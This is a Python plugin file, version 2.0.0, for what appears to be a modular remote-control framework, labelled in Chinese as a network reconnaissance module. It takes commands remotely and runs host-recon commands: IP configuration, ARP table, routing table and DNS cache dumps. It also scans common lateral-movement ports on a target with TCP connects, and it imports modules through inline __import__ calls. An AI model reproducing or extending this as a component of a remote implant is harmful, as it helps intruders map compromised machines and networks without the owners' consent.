"""网络侦查模块 - network"""

from modules.api import ModuleBase


class NetworkModule(ModuleBase):
    @property
    def name(self):
        return "network"

    @property
    def description(self):
        return "网络侦查模块 - 网络信息/ARP/路由/扫描"

    @property
    def author(self):
        return "帅丘"

    @property
    def version(self):
        return "2.0.0"

    def handle(self, cmd):
        t = cmd.get("type")
        p = cmd.get("payload")

        if t == "net":
            action = p.get("action") if p else None
            if action == "info":
                return self._net_info(p)
            elif action == "arp":
                return self._net_arp(p)
            elif action == "routes":
                return self._net_routes(p)
            elif action == "scan":
                return self._net_scan(p)
            else:
                return {"status": "error", "result": f"Unknown action: {action}", "result_type": "error"}
        elif t == "dns":
            return self._dns_cache(p)
        else:
            return {"status": "error", "result": f"Unknown command: {t}", "result_type": "error"}

    def get_commands(self):
        return ["net", "dns"]

    def _net_info(self, payload):
        try:
            result = __import__('subprocess').run(['ipconfig', '/all'], capture_output=True, text=True, timeout=10)
            return {"status": "ok", "result": result.stdout + result.stderr, "result_type": "net_info"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _net_arp(self, payload):
        try:
            result = __import__('subprocess').run(['arp', '-a'], capture_output=True, text=True, timeout=10)
            return {"status": "ok", "result": result.stdout + result.stderr, "result_type": "net_arp"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _net_routes(self, payload):
        try:
            result = __import__('subprocess').run(['route', 'print'], capture_output=True, text=True, timeout=10)
            return {"status": "ok", "result": result.stdout + result.stderr, "result_type": "net_routes"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _net_scan(self, payload):
        try:
            import sys
            target = payload.get("target", "127.0.0.1") if payload else "127.0.0.1"
            ports = payload.get("ports", "22,80,443,3389,445,135,139") if payload else "22,80,443,3389,445,135,139"
            
            ports_list = ports.split(',') if isinstance(ports, str) else ports
            
            results = []
            for port in ports_list:
                try:
                    s = __import__('socket').socket(__import__('socket').AF_INET, __import__('socket').SOCK_STREAM)
                    s.settimeout(1)
                    result = s.connect_ex((str(target), int(port)))
                    s.close()
                    if result == 0:
                        results.append(f"\n[OPEN] {target}:{port}")
                    else:
                        results.append(f"\n[CLOSED] {target}:{port}")
                except Exception as e:
                    results.append(f"\n[ERROR] {target}:{port} - {e}")
            
            return {"status": "ok", "result": f"Port Scan Results:{''.join(results)}", "result_type": "net_scan"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _dns_cache(self, payload):
        try:
            result = __import__('subprocess').run(['ipconfig', '/displaydns'], capture_output=True, text=True, timeout=10)
            return {"status": "ok", "result": result.stdout[:3000], "result_type": "dns_cache"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}


module = NetworkModule()
